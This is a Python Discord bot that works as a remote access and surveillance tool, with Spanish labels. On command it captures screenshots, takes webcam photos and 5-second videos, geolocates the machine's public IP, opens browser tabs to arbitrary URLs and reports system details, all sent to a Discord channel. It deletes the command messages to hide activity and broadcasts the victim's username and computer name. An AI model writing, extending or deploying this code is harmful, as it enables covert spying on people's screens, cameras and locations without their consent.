import os
import platform
import socket
import cpuinfo
import cv2
import discord
import psutil
import pyautogui
import requests
import webbrowser
from discord.ext import commands
import tempfile
import time
import sqlite3
import shutil

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', help_command=None, intents=intents)

@bot.event
async def on_ready():
    name = os.getenv('USERNAME')
    name2 = os.getenv('COMPUTERNAME')
    await bot.change_presence(
        activity=discord.Streaming(
            name=f'{name} | {name2}',
            url='https://www.twitch.tv/hugof'
        )
    )


@bot.command()
async def screenshot(ctx: commands.Context):
    screenshot = pyautogui.screenshot()
    filename = 'screenshot.jpg'
    screenshot.save(filename)
    embed = discord.Embed(title='Captura de Pantalla', color=1)
    file = discord.File(filename, filename=filename)
    embed.set_image(url=f'attachment://{filename}')
    await ctx.message.delete()
    await ctx.send(embed=embed, file=file)
    os.remove(filename)



@bot.command()
async def webcam(ctx: commands.Context):
    temp_file = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
    filename = temp_file.name
    temp_file.close() 
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        embed = discord.Embed(
            title='Captura de Webcam',
            description='Error: No se pudo acceder a la webcam.',
            color=1
        )
        await ctx.send(embed=embed)
        return
    try:
        ret, frame = cap.read()
        if not ret or frame is None:
            embed = discord.Embed(
                title='Captura de Webcam',
                description='Error: No se pudo tomar foto de la webcam.',
                color=1
            )
            await ctx.send(embed=embed)
            return
        cv2.imwrite(filename, frame)
        embed = discord.Embed(title='Captura de Webcam', color=1)
        file = discord.File(filename, filename="webcam.jpg")
        embed.set_image(url="attachment://webcam.jpg")
        await ctx.message.delete()
        await ctx.send(embed=embed, file=file)
    finally:
        cap.release()
        cv2.destroyAllWindows()
        if os.path.exists(filename):
            os.remove(filename)


@bot.command()
async def address(ctx: commands.Context):
    r = requests.get('http://ipwho.is/')
    if r.status_code == 200:
        data = r.json()
        if data.get('success'):
            info = f"Dirección IP: {data.get('ip')}\nTipo de IP: {data.get('type')}\nContinente: {data.get('continent')}\nPaís: {data.get('country')}\nRegión: {data.get('region')}\nCiudad: {data.get('city')}\nLatitud: {data.get('latitude')}\nLongitud: {data.get('longitude')}\nISP: {data.get('isp')}\nZona Horaria: {data.get('timezone', {}).get('id')}\n"
            url = f"https://static-maps.yandex.ru/1.x/?lang=en_US&ll={data.get('longitude')},{data.get('latitude')}&z=10&size=450,450&l=map&pt={data.get('longitude')},{data.get('latitude')},pm2rdm"
        else:
            info = 'Error: No se pudo extraer la Dirección IP.'
            url = None
        embed = discord.Embed(title='Dirección IP Capturada', description=info, color=1)
        if url:
            embed.set_image(url=url)
        await ctx.message.delete()
        await ctx.send(embed=embed)


@bot.command()
async def opentab(ctx: commands.Context, url: str):
    webbrowser.open_new_tab(url)
    embed = discord.Embed(title='Ventana del Navegador abierta.', color=1)
    await ctx.message.delete()
    await ctx.send(embed=embed)


@bot.command()
async def computer(ctx: commands.Context):
    embed = discord.Embed(title='Información del Computador.', color=1)
    pc_name = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    info = f'Nombre: {pc_name}\nSistema Operativo: {os_name} {os_release}\nVersión: {os_version}\n'
    embed.add_field(name='Identidad de la PC', value=info, inline=False)

    cpu_name = cpuinfo.get_cpu_info()['brand_raw']
    cpu_cores_physical = psutil.cpu_count(logical=False)
    cpu_cores_logical = psutil.cpu_count(logical=True)
    cpu_freq = psutil.cpu_freq()
    cpu_usage = psutil.cpu_percent(interval=1)
    info = f'Modelo: {cpu_name}\nNúcleos Lógicos: {cpu_cores_logical}\nNúcleos Físicos: {cpu_cores_physical}\nFrecuencia: {cpu_freq.current:.2f}MHz\nEn uso: {cpu_usage}%'
    embed.add_field(name='CPU', value=info, inline=False)
    await ctx.message.delete()
    await ctx.send(embed=embed)


@bot.command()
async def record_video(ctx: commands.Context): 
    temp_file = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
    filename = temp_file.name
    temp_file.close()
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("Error: No se pudo acceder a la webcam.")
        return
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while int(time.time() - start_time) < 5:  
        ret, frame = cap.read()
        if ret:
            out.write(frame)  
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    file = discord.File(filename, filename="webcam_video.mp4")
    embed = discord.Embed(title="Video grabado", color=1)
    embed.set_footer(text="Video grabado con el bot")
    await ctx.message.delete()
    await ctx.send(embed=embed, file=file)   
    if os.path.exists(filename):
        os.remove(filename)



bot.run('token aqui')
